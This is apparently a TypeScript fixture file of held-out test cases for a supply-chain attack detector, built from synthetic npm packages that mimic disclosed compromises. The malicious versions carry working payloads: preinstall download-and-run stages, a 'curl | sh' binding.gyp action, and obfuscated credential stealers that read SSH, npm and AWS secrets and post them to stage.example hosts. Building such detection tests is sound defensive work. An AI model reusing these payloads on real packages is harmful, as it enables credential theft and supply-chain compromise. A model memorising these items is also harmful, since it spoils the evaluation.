// Attacks disclosed after the reviewer's training cutoff (models.json). Each is a synthetic reduction of a public
// write-up: the trigger shape is kept, every body is written for this eval and hosts use the reserved .example domain.
// Never use these to tune prompts. Hosts are .example and any git dependency is on example-org.
import type { FileMap } from "../../src/prepass.ts";
import type { Case, Pkg } from "../2026-10-28-function-color-postinstall-hidden-download/cases.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const pkg = (o: Record<string, unknown>) => JSON.stringify(o, null, 2) + "\n";
const lib = (name: string, version: string, manifest: Record<string, unknown>, rest: Record<string, string>): Pkg =>
  ({ name, version, files: files({ "package.json": pkg({ name, version, main: "index.js", ...manifest }), ...rest }) });

export interface HeldOutCase extends Case { disclosed: string; source: string }

const STAGE = `const https = require("https");\nconst { spawn } = require("child_process");\nconst fs = require("fs");\nconst os = require("os");\nconst dest = os.tmpdir() + "/.cache-helper.js";\nhttps.get("https://stage.example/s.js", (r) => { r.pipe(fs.createWriteStream(dest)).on("close", () => spawn(process.execPath, [dest], { detached: true, stdio: "ignore" }).unref()); });\n`;

const IPC_BASE = `"use strict";\nconst listeners = new Map();\nfunction on(name, fn) { listeners.set(name, fn); }\nfunction emit(name, data) { const fn = listeners.get(name); if (fn) fn(data); }\nmodule.exports = { on, emit };\n`;

/**
 * Packs a payload the way a javascript-obfuscator build does: every `@@text@@` span moves into a hex string table
 * (with decoy entries, rotated, then unrotated at load) and the code reads it through one decoder. Nothing here runs:
 * the decoded text is inert and every host is on the reserved .example domain.
 */
const obfuscate = (body: string, rot: number): string => {
  const strs: string[] = [];
  const code = body.replace(/@@([^@]+)@@/g, (_m, str: string) => { let i = strs.indexOf(str); if (i < 0) i = strs.push(str) - 1; return `_0xd(${i})`; });
  const table = strs.map((x) => Buffer.from(x).toString("hex"));
  let seed = 7;
  const next = () => (seed = (seed * 1103515245 + 12345) % 2147483648);
  for (let i = 0; i < 90; i++) table.push(Array.from({ length: 6 + ((next() >> 8) % 12) }, () => ((next() >> 8) % 256).toString(16).padStart(2, "0")).join(""));
  const r = rot % table.length;
  const rotated = [...table.slice(r), ...table.slice(0, r)];
  return `(function () {\n  const _0xt = [${rotated.map((x) => `"${x}"`).join(", ")}];\n  for (let _0xk = ${r}; _0xk--;) _0xt.unshift(_0xt.pop());\n  const _0xd = (i) => Buffer.from(_0xt[i], "hex").toString();\n${code}})();\n`;
};
// Appended after module.exports: a gate on a hash of the module file name, a detached copy of the process marked by
// an environment variable, then the environment and credential files posted out.
const NAME_HASH = new Bun.CryptoHasher("sha256").update("ipc.cjs").digest("hex");
const IPC_TAIL = obfuscate(`  const _0xh = require(@@crypto@@).createHash(@@sha256@@).update(require(@@path@@).basename(__filename)).digest(@@hex@@);
  if (_0xh !== "${NAME_HASH}") return;
  if (process[@@env@@][@@__ipc_marker@@]) return;
  const _0xc = require(@@child_process@@);
  const _0xp = _0xc[@@spawn@@](process.execPath, process.argv.slice(1), { detached: true, stdio: @@ignore@@, env: Object.assign({}, process[@@env@@], { [@@__ipc_marker@@]: @@1@@ }) });
  _0xp.unref();
  const _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xq = require(@@path@@);
  const _0xout = { env: process[@@env@@] };
  for (const _0xn of [@@.npmrc@@, @@.ssh/id_rsa@@, @@.aws/credentials@@]) { try { _0xout[_0xn] = _0xf[@@readFileSync@@](_0xq.join(_0xo[@@homedir@@](), _0xn), @@utf8@@); } catch (_0xe) {} }
  const _0xr = require(@@https@@)[@@request@@]({ host: @@sh.stage.example@@, method: @@POST@@, path: @@/u@@ });
  _0xr.on(@@error@@, () => {});
  _0xr.end(JSON.stringify(_0xout));
`, 31);
// A large obfuscated file at the package root, outside the files list, run by the git dependency's prepare script.
const ROUTER_INIT = obfuscate(`  const _0xc = require(@@child_process@@), _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xp = require(@@path@@);
  const _0xtok = (n) => { try { return _0xf[@@readFileSync@@](_0xp.join(_0xo[@@homedir@@](), n), @@utf8@@); } catch (_0xe) { return ""; } };
  const _0xenv = Object.keys(process[@@env@@]).filter((k) => /TOKEN|KEY|SECRET|PASS/i.test(k)).map((k) => k + @@=@@ + process[@@env@@][k]);
  const _0xcred = [@@.npmrc@@, @@.ssh/id_rsa@@, @@.config/gh/hosts.yml@@, @@.aws/credentials@@].map(_0xtok);
  const _0xblob = Buffer.from(JSON.stringify({ e: _0xenv, c: _0xcred, h: _0xo[@@hostname@@]() })).toString(@@base64@@);
  const _0xsend = (b) => _0xc[@@execFile@@](process.execPath, [@@-e@@, @@require("https").request({host:"up.stage.example",method:"POST",path:"/c"}).end(process.argv[1])@@, b], { detached: true, stdio: @@ignore@@ }).unref();
  const _0xdone = _0xp.join(_0xo[@@tmpdir@@](), @@.router-init-done@@);
  if (_0xf[@@existsSync@@](_0xdone)) return;
  _0xf[@@writeFileSync@@](_0xdone, @@1@@);
  _0xsend(_0xblob);
`, 53);
const IPC_MANIFEST = { main: "ipc.cjs", exports: { ".": { import: "./index.mjs", require: "./ipc.cjs" } } };
const TANSTACK_INDEX = `export function createHistory() { const stack = []; return { push: (p) => stack.push(p), back: () => stack.pop() }; }\n`;
const tsHistory = (version: string, extra: Record<string, unknown>, rest: Record<string, string>): Pkg =>
  ({ name: "route-history", version, files: files({ "package.json": pkg({ name: "route-history", version, type: "module", main: "dist/index.js", files: ["dist"], ...extra }), "dist/index.js": TANSTACK_INDEX, ...rest }) });

export const HELDOUT: HeldOutCase[] = [
  {
    id: "keyv-style-preinstall-worm", kind: "attack", expect: "hold", disclosed: "2026-08-05",
    source: "https://www.aikido.dev/blog/keyv-and-friends-compromised-in-npm-supply-chain-attack",
    note: "patch release adds a preinstall script running a new setup.mjs that downloads and starts a second stage",
    base: [lib("kv-store", "5.3.1", {}, { "index.js": `module.exports = new Map();\n` })],
    head: [lib("kv-store", "5.3.2", { scripts: { preinstall: "node setup.mjs" } }, { "index.js": `module.exports = new Map();\n`, "setup.mjs": STAGE })],
  },
  {
    id: "node-gyp-style-binding-gyp", kind: "attack", expect: "hold", disclosed: "2026-06-03",
    source: "https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp/",
    note: "no scripts entry: a new binding.gyp action runs a shell command at install time through node-gyp",
    base: [lib("sum-native", "1.4.0", {}, { "index.js": `module.exports = (a, b) => a + b;\n` })],
    head: [lib("sum-native", "1.4.1", {}, { "index.js": `module.exports = (a, b) => a + b;\n`, "binding.gyp": `{ "targets": [{ "target_name": "x", "actions": [{ "action_name": "prep", "inputs": [], "outputs": ["x.out"], "action": ["sh", "-c", "curl -s https://stage.example/s.sh | sh"] }] }] }\n` })],
  },
  {
    id: "jscrambler-style-preinstall-binary", kind: "attack", expect: "hold", disclosed: "2026-07-11",
    source: "https://jscrambler.com/blog/security-incident-postmortem-jscrambler/",
    note: "minor release adds a preinstall hook that downloads a native binary and runs it",
    base: [lib("code-guard", "8.17.0", {}, { "index.js": `module.exports = { protect: (s) => s };\n` })],
    head: [lib("code-guard", "8.18.0", { scripts: { preinstall: "node fetch-tool.js" } }, { "index.js": `module.exports = { protect: (s) => s };\n`, "fetch-tool.js": `const https = require("https");\nconst { execFileSync } = require("child_process");\nconst fs = require("fs");\nconst dest = require("os").tmpdir() + "/guard-helper";\nhttps.get("https://stage.example/guard-helper", (r) => { r.pipe(fs.createWriteStream(dest, { mode: 0o755 })).on("close", () => execFileSync(dest, { stdio: "ignore" })); });\n` })],
  },
  {
    id: "node-ipc-style-appended-require-payload", kind: "attack", expect: "hold", disclosed: "2026-05-14",
    source: "https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack",
    note: "patch release, no install script: an obfuscated block is appended to the CommonJS bundle after module.exports and runs when the package is required; the ESM entry is unchanged",
    base: [lib("ipc-bus", "12.0.0", IPC_MANIFEST, { "ipc.cjs": IPC_BASE, "index.mjs": `export { on, emit } from "./ipc.cjs";\n` })],
    head: [lib("ipc-bus", "12.0.1", IPC_MANIFEST, { "ipc.cjs": IPC_BASE + IPC_TAIL, "index.mjs": `export { on, emit } from "./ipc.cjs";\n` })],
  },
  {
    id: "tanstack-style-git-optional-dependency", kind: "attack", expect: "hold", disclosed: "2026-05-11",
    source: "https://tanstack.com/blog/npm-supply-chain-compromise-postmortem",
    note: "1.161.6 to 1.161.9: the postmortem names only the two malicious versions, so 1.161.6 (the last release before them) comes from the registry timeline, not the postmortem; no scripts entry; the only manifest change is an optionalDependencies entry on a git commit, and a large obfuscated router_init.js sits at the package root outside the files list (the postmortem's indicators entry for that file gives the files-list detail)",
    base: [tsHistory("1.161.6", {}, {})],
    head: [tsHistory("1.161.9", { optionalDependencies: { "@route/setup": "github:example-org/example-router#79ac49eedf774dd4b0cfa308722bc463cfe5885c" } }, { "router_init.js": ROUTER_INIT })],
  },
];
